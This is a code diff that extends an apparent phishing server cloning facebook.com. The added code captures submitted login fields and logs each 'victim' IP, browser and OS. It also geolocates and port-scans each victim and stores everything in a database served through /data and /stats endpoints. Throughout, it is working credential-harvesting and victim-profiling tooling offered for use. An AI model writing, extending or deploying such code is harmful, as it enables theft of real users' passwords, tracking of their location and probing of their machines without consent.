@@ -16,28 +16,82 @@ from core.generals import generals
 from core.framework import sack
 from core.config import url
 from core.config import urlAction
+from core.db import dbMgm
+from core.geo import geo 
+from core.scanner import scanner 
 import SimpleHTTPServer
 import SocketServer
+import httpagentparser
+import requests
 import urllib2
 import time
 import cgi
 import os
 import sys
+import json
 from socket import error as socerr
 from bs4 import BeautifulSoup as bs
 
 Framework = sack()
+dbMgm = dbMgm()
+geo = geo()
+scanner = scanner()
+serverUrl = ""
 
-class serverHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-
+class serverHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): 
+    
     def do_POST(self):
+        # Details dates, times, userSystem
+        self.userSystem = {}
+        self.host = self.headers.get("host")
+        self.ua = self.headers.get("user-agent")
+        self.uaParser = httpagentparser.detect(self.ua)
+        self.userSystem = {
+          "useragent": str(self.ua),
+          "browser-name": str(self.uaParser["browser"]["name"]), 
+          "browser-version": str(self.uaParser["browser"]["version"]),
+          "os": str(self.uaParser["os"]["name"])
+        }
+        self.timeDat = {
+          "one": time.strftime("%H:%M:%S"), 
+          "two": time.strftime("%H" + "%M" + "%S"),
+          "three": time.strftime("%Y/%m/%d")
+        }
 
-        lastip = ""
-        newIp = self.client_address[0]
-        if lastip != newIp:
-            Framework.shellLog("New victim connected" + ":" + " " + newIp)
-        lastip = self.client_address
 
+        # reflect ip to victim
+        currentIp2 = geo.showIPclient()
+        currentIp = currentIp2
+
+        if dbMgm.isNewVictim(currentIp):
+            Framework.shellLog("New victim connected" + ":" + " " + currentIp)
+        else:
+            Framework.shellLog("Recurrent victim connected" + ":" + " " + currentIp)
+
+        generals.Go("")
+        generals.Go(generals.Color["redBold"] + ">" + generals.Color["white"] + "--" + generals.Color["yellowBold"] + "=" + generals.Color["blueBold"] + "[+]" + generals.Color["white"] + " " + "System information of the victim")
+        generals.Go(generals.Color["redBold"] + ">" + generals.Color["whiteBold"] + "=" + "=" + generals.Color["whiteBold"] + "|" + generals.Color["white"] + "---" + " Browser:" + " " + generals.Color["whiteBold"] + self.userSystem["browser-name"] + generals.Text["end"])
+        generals.Go(generals.Color["redBold"] + ">" + generals.Color["whiteBold"] + "=" + "=" + generals.Color["whiteBold"] + "|" + generals.Color["white"] + "---" + " Browser version:" + " " + generals.Color["whiteBold"] + self.userSystem["browser-version"] + generals.Text["end"])
+        generals.Go(generals.Color["redBold"] + ">" + generals.Color["whiteBold"] + "=" + "=" + generals.Color["whiteBold"] + "|" + generals.Color["white"] + "---" + " Operating system:" + " " + generals.Color["whiteBold"] + self.userSystem["os"] + generals.Text["end"])
+
+        # endpoint for webservice data one
+        if self.path == '/data':  
+            data = dbMgm.getAll()
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            self.end_headers()
+            self.wfile.write(data)
+            return 
+
+        if self.path == '/data2':  
+            data = dbMgm.getAll2()
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            # self.send_header('Content-length', len(data))
+            self.end_headers()
+            self.wfile.write(data)
+            return 
+        
         # endpoint to show session state
         if self.path == '/not_logged':
             Framework.shellLog('User is not logged we can procced')
@@ -46,7 +100,7 @@ class serverHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             self.end_headers()
             return
 
-        # endpoint to show session state
+        # endxpoint to show session state
         if self.path == '/logged':
             Framework.shellLog('User is logged we can not procced')
             self.send_response(200)
@@ -54,9 +108,41 @@ class serverHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             self.end_headers()
             return
 
+        # endxpoint 
+        if self.path == '/stats': 
+            data = dbMgm.getStats()
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            # self.send_header('Content-length', len(data))
+            self.end_headers()
+            self.wfile.write(data)
+            return
+
+        if self.path == '/ping':  
+            content_length = int(self.headers.getheader('content-length'))        
+            body = self.rfile.read(content_length)
+            result = json.loads(body, encoding='utf-8')  
+            data = dbMgm.ping(result["ip"])
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            # self.send_header('Content-length', len(data))
+            self.end_headers()
+            self.wfile.write(data)
+            return
+
+        if self.path == '/pong': 
+            content_length = int(self.headers.getheader('content-length'))        
+            body = self.rfile.read(content_length)
+            result = json.loads(body, encoding='utf-8')  
+            data = dbMgm.pong(result["ip"])
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            # self.send_header('Content-length', len(data))
+            self.end_headers()
+            self.wfile.write(data)
+            return
+
         requestPost = []
-        dateLogOne = time.strftime("%H:%M:%S")
-        dateLogTwo = time.strftime("%H" + "%M" + "%S")
 
         generals.Go("")
         generals.Go(generals.Color["blueBold"] + "[*]" + " " + generals.Color["whiteBold"] + "Recent:" + " " + generals.Text["end"] + "request processed via " + generals.Color["greenBold"] + "POST" + generals.Color["white"])
@@ -69,7 +155,7 @@ class serverHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             }
         )
         try:
-            logFile = "%s" % dateLogTwo + ".log"
+            logFile = "%s" % self.timeDat["two"] + ".log"
             path = os.getcwd() + "/logs/" + logFile
             registerLogs = open(path, "a")
             registerLogs.write("\n")
@@ -80,33 +166,54 @@ class serverHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             #registerLogs.write("\n")
             #registerLogs.write("# PORT: %s" % port)
             #registerLogs.write("\n")
-            registerLogs.write("# LOG: %s" % dateLogTwo)
+            registerLogs.write("# LOG: %s" % self.timeDat["two"])
             registerLogs.write("\n")
-            registerLogs.write("# DATE: %s" % dateLogOne)
+            registerLogs.write("# DATE: %s" % self.timeDat["one"])
             registerLogs.write("\n")
             registerLogs.write("\n")
             registerLogs.write("\n")
             registerLogs.write("# Data obtained from the victim")
             registerLogs.write("\n")
             registerLogs.write("\n")
-            registerLogs.write("New victim connected:" + " " + self.client_address[0])
+            registerLogs.write("IP victim:" + " " + currentIp)
             registerLogs.write("\n")
             registerLogs.write("\n")
 
+            result = []
             for doTag in form.list:
                 temp = str(doTag).split("(")[1]
                 nameKey, inputValue = temp.replace(")", "").replace("\'", "").replace(",", "").split()
                 requestPost.append("%s %s" % (nameKey, inputValue))
                 generals.Go(generals.Color["yellowBold"] + "+" + generals.Color["blue"] + "--" + generals.Color["whiteBold"] + "=" + " " + generals.Color["greenBold"] + "%s" % (nameKey) + generals.Color["white"] + " --" + generals.Color["whiteBold"] + ">" + " " + generals.Text["end"] + generals.Color["blue"] + "%s" % (inputValue))
                 registerLogs.write("%s ---> %s" % (nameKey, inputValue) + "\n")
+                result.append("<div class='data'><strong>%s:</strong>%s</div>" % (nameKey, inputValue) + "\n")
             registerLogs.close()
+
+            data = {   
+                        "status": "online",
+                        "date": self.timeDat["three"],
+                        "time": self.timeDat["one"],
+                        "endpoint": self.host, 
+                        "target": "facebook.com",
+                        "ip": currentIp,
+                        "os": self.userSystem["os"],
+                        "browser": self.userSystem["browser-name"],
+                        "browserVersion": self.userSystem["browser-version"],
+                        "useragent": self.userSystem["useragent"], 
+                        "ports":  scanner.scanIP(currentIp),
+                        "data" :  "".join(result) or ""
+                      }
+            geoInfo = geo.getGeoInfo(currentIp)
+            data.update(geoInfo) 
+            dbMgm.storeLog(data) 
 
             Framework.generatePost(url, urlAction, requestPost)
             SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
         except socerr as error:
-            generals.Go(generals.Color["redBold"] + "Error different: " + generals.Color["white"] + "something bad has last" + generals.Text("end") + " " + generals.Color["blue"] + "(%s)" % str(error))
+            generals.Go(generals.Color["redBold"] + "Error different: " + generals.Color["white"] + "something bad has last" + generals.Text["end"] + " " + generals.Color["blue"] + "(%s)" % str(error))
         except Exception as error:
-            generals.Go(generals.Color["redBold"] + "Error different: " + generals.Color["white"] + "something bad has last" + generals.Text("end") + " " + generals.Color["blue"] + "(%s)" % str(error))
+            print error
+            generals.Go(generals.Color["redBold"] + "Error different: " + generals.Color["white"] + "something bad has last" + generals.Text["end"] + " " + generals.Color["blue"] + "(%s)" % str(error))
 
     def log_message(self, format, *arguments):
         argument = format % arguments
@@ -219,7 +326,7 @@ class componentBase(object):
         #pathIndex = os.getcwd() + "/data/" + indexFile
 
         with open("index.html", "w") as html:
-            html.write(data.prettify().encode('utf-8').replace("</head>","<script src='/assets/app.js'></script></head>"))
+            html.write(data.prettify().encode('utf-8').replace("</head>","<script src='/assets/js/jquery.min.js'></script><script src='/assets/js/logged.js'></script></head>"))
             html.close()
 
     def run(self):
@@ -230,6 +337,7 @@ class componentBase(object):
             generals.Go("------------------------------------------------------------")
             self.sackserver = SocketServer.TCPServer(("", self.port), serverHandler)
             self.sackserver.serve_forever()
+            serverUrl =  "localhost" + ":" + "%s" % (self.port) 
         except Exception as errorCase:
             generals.Go("")
             generals.Go(generals.Color["yellowBold"] + "Notice:" + " " + generals.Color["white"] + "Occurred a problem on the server. Perhaps the port that running is already in use, try again." + " " + generals.Color["blue"] + "(read the case below)")
